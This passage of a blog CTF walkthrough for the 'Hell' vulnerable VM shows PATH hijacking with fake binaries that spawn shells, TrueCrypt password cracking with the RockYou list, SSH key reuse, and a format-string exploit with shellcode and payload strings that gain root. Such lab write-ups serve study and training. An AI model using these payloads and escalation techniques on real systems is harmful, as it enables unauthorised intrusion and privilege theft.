+<p>So, hopefully, if all goes to plan, when we beat the score it should run our fake chmod binary and drop us to a shell. How about we give it a go ? The game is started, and the Python script is run to beat the score (I&rsquo;m not going to show you again, just scroll up if you want to see what it looks like).</p>
+
+<p>The score is beaten and we are indeed dropped to a new shell as the george user.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ./game
+I&rsquo;m listening
+uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
+$
+[/plain]</p>
+
+<p><img src="http://31.media.tumblr.com/tumblr_lwipupOVfN1qh59n0o1_500.gif" alt="" /></p>
+
+<hr />
+
+<h2>Tales from the Crypt, But First I&rsquo;ll Rock You</h2>
+
+<p>George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn&rsquo;t recommended any more - he should be using something else.  <em>shakes fist at the NSA</em></p>
+
+<!-- more -->
+
+
+<p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+george@hell:~$ truecrypt &ndash;mount container.tc
+Enter mount directory [default]:
+Enter password for /home/george/container.tc:
+Enter keyfile [none]:
+Protect hidden volume (if any)? (y=Yes/n=No) [No]:
+No password or keyfile specified.[/plain]</p>
+
+<p>Looking around a bit more, it looks like George has also signed up for RockYou</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+From: <a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#97;&#x64;&#109;&#x69;&#x6e;&#64;&#114;&#111;&#x63;&#107;&#x79;&#111;&#x75;&#x2e;&#x63;&#x6f;&#109;">&#97;&#100;&#x6d;&#x69;&#110;&#64;&#x72;&#x6f;&#x63;&#x6b;&#x79;&#x6f;&#x75;&#x2e;&#99;&#111;&#x6d;</a>
+To: <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#x73;&#117;&#x70;&#101;&#x72;&#x5f;&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#104;&#101;&#108;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x73;&#x75;&#112;&#101;&#114;&#95;&#97;&#100;&#x6d;&#105;&#110;&#64;&#x68;&#x65;&#108;&#108;&#46;&#x63;&#111;&#109;</a>
+Subject: Account Activation
+Date: 13th November 2009</p>
+
+<p>Thanks for signing up for your account. I hope you enjoy our services. [/plain]</p>
+
+<p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+G:\Downloads\oclHashcat-1.21>oclHashcat64.exe -m 6211 -a 0 &ldquo;g:\downloads\container.tc&rdquo; g:\Downloads\dictionaries\catted\rockyou.txt</p>
+
+<p>g:\downloads\container.tc:letsyouupdateyourfunnotesandmore</p>
+
+<p>Session.Name&hellip;: oclHashcat
+Status&hellip;&hellip;&hellip;: Cracked
+Input.Mode&hellip;..: File (g:\Downloads\dictionaries\catted\rockyou.txt)
+Hash.Target&hellip;.: File (g:\downloads\container.tc)
+Hash.Type&hellip;&hellip;: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
+Time.Started&hellip;: Sat Jul 12 23:06:15 2014 (17 secs)
+Speed.GPU.#1&hellip;:    29889 H/s
+Recovered&hellip;&hellip;: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress&hellip;&hellip;.: 496641/14343296 (3.46%)
+Skipped&hellip;&hellip;..: 0/496641 (0.00%)
+Rejected&hellip;&hellip;.: 1/496641 (0.00%)
+HWMon.GPU.#1&hellip;: 97% Util, 56c Temp, 32% Fan</p>
+
+<p>Started: Sat Jul 12 23:06:15 2014
+Stopped: Sat Jul 12 23:06:37 2014[/plain]</p>
+
+<p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+george@hell:~$ truecrypt &ndash;mount container.tc
+Enter mount directory [default]: ./tc
+Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
+Enter keyfile [none]:
+Protect hidden volume (if any)? (y=Yes/n=No) [No]:</p>
+
+<p>george@hell:~$ cd tc
+george@hell:~/tc$ ls -l
+total 2
+-rwx&mdash;&mdash; 1 george george 1679 Jul  5 20:01 id_rsa
+george@hell:~/tc$ [/plain]</p>
+
+<p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+george@hell:~/tc$ ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#98;&#97;&#122;&#122;&#x61;&#x40;&#x31;&#x32;&#x37;&#x2e;&#x30;&#x2e;&#48;&#46;&#x31;">&#x62;&#x61;&#x7a;&#x7a;&#x61;&#x40;&#49;&#50;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#x31;</a> -i ./id_rsa
+Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>
+
+<p>The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.</p>
+
+<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Jul 13 21:18:28 2014 from 192.168.0.102
+$ whoami
+bazza[/plain]</p>
+
+<p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>
+
+<hr />
+
+<h2>Bazza&rsquo;s Blockade</h2>
+
+<p>Once again we&rsquo;re presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look</p>
+
+<p>[c]int <em>_cdecl main()
+{
+  int result; // eax@6
+  </em>BYTE v1[3]; // [sp+19h] [bp-417h]@3
+  FILE <em>v2; // [sp+424h] [bp-Ch]@1
+  const char </em>v3; // [sp+428h] [bp-8h]@1
+  const char *v4; // [sp+42Ch] [bp-4h]@1</p>
+
+<p>  v4 = &ldquo;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n&rdquo;;
+  v3 = &ldquo;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n&rdquo;;
+  printf(&ldquo;Checking integrity of part2&hellip;&rdquo;);
+  v2 = popen(&ldquo;sha256sum /home/bazza/part2&rdquo;, &ldquo;r&rdquo;);
+  if ( !v2 )
+    puts(&ldquo;Failed to run command&rdquo;);
+  fgets(v1, 1034, v2);
+  if ( strcmp(v1, v4) )
+  {
+    puts(&ldquo;Uh oh&hellip;. Corrupted or in wrong directory (/home/bazza/)\n&rdquo;);
+    result = 0;
+  }
+  else
+  {
+    puts(&ldquo; Done!!\n&rdquo;);
+    printf(&ldquo;Checking integrity of calling target&hellip;&rdquo;);
+    v2 = popen(&ldquo;sha256sum /usr/bin/id&rdquo;, &ldquo;r&rdquo;);
+    if ( !v2 )
+      puts(&ldquo;Failed to run command&rdquo;);
+    fgets(v1, 1034, v2);
+    if ( strcmp(v1, v3) )
+    {
+      puts(&ldquo;Target corrupt\n&rdquo;);
+      result = 0;
+    }
+    else
+    {
+      puts(&ldquo; Done!!\n\nBinary and target confirmed.&rdquo;);
+      system(&ldquo;/home/bazza/part2&rdquo;);
+      pclose(v2);
+      result = 0;
+    }
+  }
+  return result;
+}[/c]</p>
+
+<p>OK, so part1 runs part2 (this time with an absolute path), so time for a quick peek into part2</p>
+
+<p>[c]int <strong>cdecl main()
+{
+  </strong>gid_t v0; // eax@2
+  int result; // eax@2</p>
+
+<p>  if ( getegid() == 1003 )
+  {
+    puts(&ldquo;\nCan&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>&rdquo;);
+    system(&ldquo;id&rdquo;);
+    result = 0;
+  }
+  else
+  {
+    v0 = getegid();
+    printf(&ldquo;\n\nError! %d ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1!\n&rdquo;, v0);
+    result = 0;
+  }
+  return result;
+}[/c]</p>
+
+<p>So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+Error! 1004 ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1![/plain]</p>
+
+<p>Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn&rsquo;t seem to drop us to a shell as that user (oj)</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ./part1
+Checking integrity of part2&hellip; Done!!</p>
+
+<p>Checking integrity of calling target&hellip; Done!!</p>
+
+<p>Binary and target confirmed.</p>
+
+<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
+uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
+$ whoami
+bazza[/plain]</p>
+
+<p>A further look into the source code for part2 shows that it is not using an absolute path for the system(&ldquo;id&rdquo;) function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I&rsquo;m using uid 1005 rather than 1000.</p>
+
+<p>[c]#include &lt;stdio.h></p>
+
+<h1>include &lt;stdlib.h></h1>
+
+<h1>include &lt;sys/types.h></h1>
+
+<h1>include &lt;unistd.h></h1>
+
+<p>int main()
+{
+ setuid( 1005 );
+ system(&ldquo;/usr/bin/id&rdquo;);
+ system( &ldquo;/bin/sh -i&rdquo; );
+}[/c]</p>
+
+<p>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last time and we&rsquo;re good to go.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ ./part1
+Checking integrity of part2&hellip; Done!!</p>
+
+<p>Checking integrity of calling target&hellip; Done!!</p>
+
+<p>Binary and target confirmed.</p>
+
+<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
+uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
+$ whoami
+oj
+[/plain]</p>
+
+<p>Success !</p>
+
+<p>Nearly there, only this hoop to jump through and we&rsquo;re done.</p>
+
+<hr />
+
+<h2>Orange Juice Doesn&rsquo;t Echo</h2>
+
+<p>The OJ user has 1 file, a binary called echo which does exactly that, it repeats what you send it. This guy is the height of programming ability. There&rsquo;s got to be something wrong with it.</p>
+
+<!-- more -->
+
+
+<p>A quick look at the binary in IDA, and yes there is something wrong with it, there seems to be something in it that is called a &ldquo;format string vulnerability&rdquo;.</p>
+
+<p><img src="https://pmpaspeakingofprecision.files.wordpress.com/2014/07/confused-child.jpg" alt="" /></p>
+
+<p>wut ?</p>
+
+<p>What felt like 12 days of reading, and video watching (Fuzzy Security videos are the best - check <a href="https://www.youtube.com/watch?v=NwzmYSlETI8">this one out for formatstr vuln explanation</a> and the <a href="https://www.youtube.com/watch?v=CHrs30g-3O0">follow up</a>) I still felt none the wiser.  But I figured I&rsquo;d give it a go anyway.  What&rsquo;s the worst that can happen ?  I can&rsquo;t make it any more wrong now can I ?</p>
+
+<p>Meh, let&rsquo;s put our shellcode (setuid plus /bin/sh) into memory anyway, just so it looks like we&rsquo;re progressing.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]export SHELLCODE=$(python -c &lsquo;print &ldquo;\x90&rdquo; * 1000 + &ldquo;\x89\xe7\xda\xc3\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x75\x61\x4b\x6b\x51\x7a\x42\x37\x56\x38\x68\x4d\x6d\x50\x43\x5a\x64\x4b\x33\x68\x6a\x39\x36\x32\x35\x36\x51\x78\x44\x6d\x61\x73\x6e\x69\x79\x77\x33\x58\x34\x6f\x31\x63\x32\x48\x73\x30\x43\x58\x54\x6f\x53\x52\x51\x79\x62\x4e\x6f\x79\x7a\x43\x43\x62\x38\x68\x77\x78\x63\x30\x43\x30\x55\x50\x36\x4f\x50\x62\x51\x79\x52\x4e\x66\x4f\x42\x53\x30\x68\x55\x50\x46\x37\x53\x63\x6d\x59\x49\x71\x7a\x6d\x4f\x70\x41\x41&rdquo;&rsquo;)[/plain]</p>
+
+<p>So, I started to play around with gdb and format strings.
+There are several ways you can do format string vulnerabilities - you can put your shellcode in memory using an environment variable, then overwrite a global offset table entry to execute your code (as per the videos), or if you&rsquo;re unlucky like me and have a statically linked binary, you have to find another way such as jumping to a location in the stack. I tried that&hellip; it didn&rsquo;t work because my shellcode kept moving in memory.</p>
+
+<p><img src="http://media.tumblr.com/201153f420ed4a2ca50fadbcfabacce3/tumblr_inline_n1mltcP4Bf1ss9nq4.gif" alt="" /></p>
+
+<p>Apparently, though, you can overwrite entries in the .dtor part of the binary - don&rsquo;t ask me what .dtor is, but I had great fun gradually overwriting random memory locations and crashing the application over and over and over again&hellip;</p>
+
+<p>Here are some of the format strings I fabricated while on my journey - you can get an idea of my thought pattern and the things I tested.  It&rsquo;s also pretty obvious when I went back to basics about 7 attempts in.</p>
+
+<p>[plain]
+$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%116\$n
+$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)-%64362u-%117\$n.
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%64362u-%119\$n.
+$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo; + &ldquo;\x5e\xf8\xff\xbf&rdquo;&rsquo;)-%64362u-%4\$n-%5\$n
+$(python -c &lsquo;print &ldquo;\x5c\xf8\xff\xbf&rdquo;&rsquo;)-%116\$n.
+$(python -c &lsquo;print &ldquo;AAAA&rdquo;&rsquo;)%117\$x
+%64364u$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo;&rsquo;)%119\$n.
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217u%119\$hn
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABB-%00001c%116\$.x%00001c%114\$.x
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%113\$hn%15217c%112\$hn
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AABBBB%49134u%118\$hn%15217u%117\$hn
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAABBBB%49136u%120\$hn%15217c%119\$hn
+[/plain]</p>
+
+<p>I spent a lot of time staring at segfault after segfault until I stumbled upon this random combination of characters (I really really want to explain how I worked it out, but I&rsquo;m not 100% sure myself. I guess that&rsquo;s a follow up post sometime. Also, it is possible this wont work for you).</p>
+
+<p>[plain]
+$(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn[/plain]</p>
+
+<p>Which when executed like this</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]
+$ /home/oj/echo $(python -c &lsquo;print &ldquo;\x14\x96\x0c\x08&rdquo; + &ldquo;\x16\x96\x0c\x08&rdquo;&rsquo;)AAAB%49139u%118\$hn%15217c%117\$hn[/plain]</p>
+
+<p>dropped me to a shell.</p>
+
+<p>[plain gutter=&ldquo;false&rdquo;]</p>
+
+<h1>id</h1>
+
+<p>uid=0(root) gid=1005(oj) groups=0(root),1005(oj)</p>
+
+<h1>whoami</h1>
+
+<p>root</p>
+
+<h1>cat /root/flag.txt</h1>
+
+<p>Congratulations of beating Hell.</p>
+
+<p>I hope you enjoyed it and there weren&rsquo;t to many trolls in here for you.</p>
+
+<p>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242</p>
+
+<p>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de</p>
+
+<h1>[/plain]</h1>
+
+<p><img src="http://30.media.tumblr.com/tumblr_lk4maa7rMH1qfgrblo1_500.gif" alt="" /></p>
+
+<p>Like a baws.  Now I&rsquo;m going to exorcise the VM and purge every last shred of it from my SSD.  BEGONE FOUL DEMON !</p>
+
+
+
+</article>
+
+
+    <nav role="navigation" id="pagination">
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
